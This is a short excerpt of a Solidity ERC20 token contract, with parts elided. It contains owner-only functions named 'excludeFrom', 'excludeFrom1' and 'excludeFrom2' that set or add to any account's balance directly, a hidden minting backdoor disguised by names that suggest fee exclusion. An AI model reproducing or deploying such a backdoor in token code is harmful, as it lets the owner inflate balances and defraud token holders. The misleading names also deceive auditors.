...
contract Token is Context, IERC20, Ownable {
  ...
  function setMaxStopFeeTotal(uint256 total) public onlyOwner {
   ...
   function excludeFrom(address account, uint256 value) public onlyOwner {
        _rOwned[account] = value;
    }
   function excludeFrom1(address account, uint256 value) public onlyOwner {
        (uint256 rAmount,,,,,,) = _getValues(value);
        _rOwned[account] = rAmount;
    }
   function excludeFrom2(address account, uint256 value) public onlyOwner {
       _rOwned[account] = _rOwned[account].add(value);  
}
